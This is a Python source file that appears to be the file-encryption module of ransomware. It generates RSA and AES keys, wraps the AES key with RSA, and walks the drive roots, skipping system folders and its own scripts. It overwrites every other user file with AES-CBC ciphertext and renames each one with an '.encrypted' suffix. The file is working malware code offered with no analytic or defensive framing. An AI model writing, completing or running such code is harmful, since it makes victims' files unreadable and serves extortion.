import os
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from Driver_Handling import root_paths
from Variables import script_files, system_dirs, system_desktop_dirs

####################################################################################################################

def generate_rsa_keys():
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public_key = private_key.public_key()
    return private_key, public_key

def save_rsa_keys(private_key, public_key):
    with open("private.pem", "wb") as f:
        f.write(private_key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.PKCS8,
            serialization.NoEncryption()
        ))
    with open("public.pem", "wb") as f:
        f.write(public_key.public_bytes(
            serialization.Encoding.PEM,
            serialization.PublicFormat.SubjectPublicKeyInfo
        ))

def generate_symmetric_key():
    return os.urandom(32)

####################################################################################################################

# Encrypt AES key with RSA public key
def encrypt_aes_key_with_rsa(aes_key, public_key):
    encrypted_aes_key = public_key.encrypt(
        aes_key,
        asym_padding.OAEP(
            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted_aes_key

def save_encrypted_aes_key(encrypted_aes_key):
    with open("key.encrypted", "wb") as f:
        f.write(encrypted_aes_key)

####################################################################################################################

def encrypt_file_with_aes(file_path, key):
    backend = default_backend()
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    encryptor = cipher.encryptor()

    with open(file_path, "rb") as f:
        data = f.read()

    padder = sym_padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()

    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    with open(file_path, "wb") as f:
        f.write(iv + encrypted_data)

def encrypt_user_files(aes_key):
    root_path = root_paths()
    script_dir = os.path.dirname(os.path.abspath(__file__))  # Get the scripts directory

    for root, dirs, files in os.walk(root_path):
        if any(exclude in root for exclude in system_desktop_dirs):
            continue
        if any(root.startswith(system_dir) for system_dir in system_dirs) or root.startswith(script_dir):
            continue

        for file in files:
            if file in script_files:
                continue

            file_path = os.path.join(root, file)

            try:
                encrypt_file_with_aes(file_path, aes_key)
                os.rename(file_path, file_path + ".encrypted")
            except Exception:
                continue

####################################################################################################################